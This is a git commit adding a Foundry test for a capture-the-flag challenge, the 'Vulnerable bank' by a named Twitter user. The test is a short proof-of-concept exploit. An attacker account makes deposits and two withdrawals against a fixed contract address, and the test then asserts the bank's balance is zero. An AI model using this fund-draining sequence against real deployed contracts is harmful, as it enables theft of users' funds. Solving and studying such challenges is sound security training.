c02d5b86ba9a02b5cb6efbb295725e92287e7d49
dec3ntraliz3d <sa6210441@pm.me>
2022-10-12 11:55:55 -0400

    Vulnerable bank CTF by @paladin_marco twitter:https://twitter.com/paladin_marco/status/1580127836932780032?s=20&t=sRbGweoQSKlrO03hre-hnQ

---
+++ test/VulnerableBank/VulnerableBank.t.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import {VulnerableBank} from "../../src/VulnerableBank/VulnerableBank.sol";
+
+contract VulnerableBankTest is Test {
+    VulnerableBank bank;
+    address attacker;
+
+    function setUp() public {
+        attacker = address(
+            uint160(uint256(keccak256(abi.encodePacked("attacker"))))
+        );
+        vm.deal(attacker, 1 ether);
+        vm.label(attacker, "attacker");
+        bank = VulnerableBank(0x970c48a82046926330922Da0bf4C54bc4917aB73);
+    }
+
+    function testDrainFund() public {
+        vm.startPrank(attacker);
+        bank.deposit{value: 0.014 ether}();
+        bank.deposit();
+        bank.withdraw(1);
+        bank.withdraw(1);
+        assertEq(address(bank).balance, 0);
+    }
+}
